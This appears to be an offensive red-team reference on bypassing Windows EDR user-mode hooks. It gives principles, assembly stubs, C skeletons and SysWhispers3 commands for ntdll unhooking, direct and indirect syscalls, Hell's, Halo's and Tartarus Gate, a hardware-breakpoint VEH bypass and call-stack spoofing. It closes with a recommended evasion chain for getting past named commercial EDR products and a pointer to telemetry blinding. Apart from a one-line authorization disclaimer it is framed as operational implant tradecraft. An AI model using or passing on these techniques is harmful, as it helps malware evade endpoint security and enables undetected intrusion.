# Unhook / Direct / Indirect Syscall Technique Inventory

> Authorized red teaming / adversary emulation / own-product testing only; use against unauthorized targets is forbidden.

This document consolidates the current mainstream "user-mode hook bypass" techniques, from the classic unhook to the latest hardware breakpoint Blindside.
All techniques are mapped to MITRE ATT&CK T1562.001 / T1027 / T1055 for easy report output.

## 1. Peruns Fart / Fresh Ntdll from disk

### Principle

An EDR's hooks all live in **ntdll.dll in the current process's memory**. The on-disk `C:\Windows\System32\ntdll.dll` is clean.
So if you re-map the on-disk ntdll into the current process and overwrite the in-memory `.text` section, the hooks get wiped.

```text
Current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (with EDR hook jmps) │ ◄── overwrite with the clean .text from disk
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  Disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation Essentials

```c
// Steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // native path to evade monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection at a new address
// 4. Find the .text section at the new address
// 5. NtProtectVirtualMemory to make the current ntdll .text RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory to restore RX
```

### Notes

- `NtProtectVirtualMemory` itself may be hooked → chained problem. Solution: call `NtProtectVirtualMemory` first via **direct syscall**
- Modern EDRs already monitor W operations by `NtProtectVirtualMemory` on ntdll memory — pair with an ETW patch
- Peruns Fart leaves `KERNEL_MODULE_LOAD`, `PROTECTVM` events under ETW-TI — ETW must be suppressed first

## 2. Direct Syscall

### Principle

Instead of calling ntdll's exported functions, write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (value on Win11 24H2; differs per version)
    syscall
    ret
```

The `syscall` instruction jumps straight from user mode to the kernel SSDT, skipping any user-mode hook.

### SysWhispers3 Usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stubs
syscallsstubs.std.x64.asm  - standard direct syscalls
```

In Visual Studio:

```text
1. Add the .asm to the project, enable MASM (Custom Build Tool)
2. include syscalls.h
3. Call Sw3NtAllocateVirtualMemory(...) replacing the original NtAllocateVirtualMemory
```

### Minimal direct syscall calling NtCreateFile (C code skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (dynamic SSN resolution)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // write some bytes — omitted
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Drawbacks

- The syscall instruction lives in the implant's own `.text` section (not inside ntdll) → kernel-mode telemetry can easily spot "syscall from non-ntdll address"
- That is why indirect syscalls exist

## 3. Indirect Syscall

### Principle

The syscall instruction still comes from ntdll.dll (a legitimate address); only the SSN and return address are under our control:

```text
Implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of some syscall;ret gadget inside ntdll>]   ; the syscall is not in the implant
```

The gadget jumped to is usually the `syscall; ret` two-byte sequence at the end of an `Nt*` function.
The RIP seen by the kernel-mode ETW provider is an ntdll address, matching a legitimate behavior pattern.

### SysWhispers3 indirect mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize the jmp target to reduce signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; returns SSN -> eax
    call Sw3GetSyscallAddress      ; returns the syscall;ret address in ntdll -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to the legitimate syscall instruction inside ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

The three are an evolution solving "dynamic SSN resolution".

### Hell's Gate

- Assumes ntdll is not hooked
- At implant startup, walks ntdll's `Nt*` exports and extracts the SSN from the first 4 bytes `mov eax, <SSN>`
- Advantage: no hardcoded SSN, portable across Windows versions
- Drawback: extraction fails if ntdll is already hooked (first bytes replaced by a jmp)

### Halo's Gate

- Fixes Hell's Gate's hook problem
- If a function is found hooked (non-standard prologue), **scan ±N neighboring functions up/down**
- Exploits the fact that SSNs of `Nt*` functions in ntdll are consecutive and increasing, deriving the hooked function's SSN from its neighbors

```text
Normal case:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and the SSN is invisible, look at the neighbors:
  Previous unhooked export SSN = 0x17
  Next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- Further handles advanced hooks that **change the SSN but keep the syscall instruction**
- Validates both the SSN and the syscall;ret gadget address
- The three combined provide the most stable indirect syscall foundation

### Reference implementation locations (after the bootstrapped git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (includes fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware Breakpoint Blindside

### Principle

Use debug registers `DR0-DR3` to set a hardware breakpoint at the entry of an EDR hook trampoline;
install a VEH (Vectored Exception Handler) so that when the breakpoint hits, RIP is **redirected straight past the hook trampoline**,
skipping the EDR's detection code and landing on ntdll's real syscall section.

### Advantages

- No need to write to ntdll memory (no `NtProtectVirtualMemory` alert)
- No need to unhook (the hook is still there, just bypassed)
- ETW-TI sees no memory modification

### Implementation Skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. Set DR0..DR3 at each hooked function entry (max 4; combine with single-step rotation)
// 3. SetThreadContext(thread, &ctx) to write DRx
// 4. When the EDR hook trampoline triggers the hardware breakpoint -> the VEH takes over
// 5. The VEH changes EXCEPTION_POINTERS->ContextRecord->Rip to ntdll's legitimate syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN already in eax; R10 = RCX; jump to ntdll's syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- DRx is per-thread → multithreaded implants must set them individually
- Some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; bypass that first with the earlier techniques
- Win11 22H2+ introduced HVCI / some anti-debug mitigations may interfere

## 6. Call Stack Spoofing

### The Problem

Modern EDRs call `RtlCaptureStackBackTrace` at the kernel entry of syscalls like `NtAllocateVirtualMemory` / `NtCreateThreadEx`,
capturing and reporting the full call stack. The implant's stack will show **non-image-backed memory** frames → high-confidence alert.

### Option A: CallStackSpoofer (William Burgess)

Implementation idea:

1. Before the syscall, swap the current thread's stack → a spoofed legitimate stack
2. Fill the fake stack frames with an entirely legitimate return chain such as `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. After the syscall returns, swap back to the real stack

### Option B: SilentMoonwalk

More aggressive, uses a desynchronized stack:

```text
Execution flow:
  implant code  →  custom trampoline (modifies RSP / RBP / stack contents)
                ↓
                syscall (RtlCaptureStackBackTrace sees the spoofed stack)
                ↓
                trampoline restores → implant code continues
```

The key is unwinding: make `RtlVirtualUnwind` walk into a forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Practical OPSEC Advice

- Call stack spoof + indirect syscall + ETW patch is currently the most reliable combination for getting past CrowdStrike / SentinelOne
- Spoof during the sleep phase too — spoofing only during execution is not enough (EDRs sample periodically)

## 7. Technique Selection Matrix

| Technique | Counters | Complexity | Current Effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | user-mode hooks | low | medium (easily caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | user-mode hooks | low | low-medium (kernel sees RIP in the implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | user-mode hooks + kernel RIP checks | medium | medium-high | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | medium | high (infrastructure) | T1027 |
| HWBP Blindside | hooks + write-free | high | high | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry | high | high | T1564 |

Recommended practical chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing Callback

Unhooking is only half the bypass; the other half is blinding telemetry: proceed to `references/telemetry-blinding.md`.
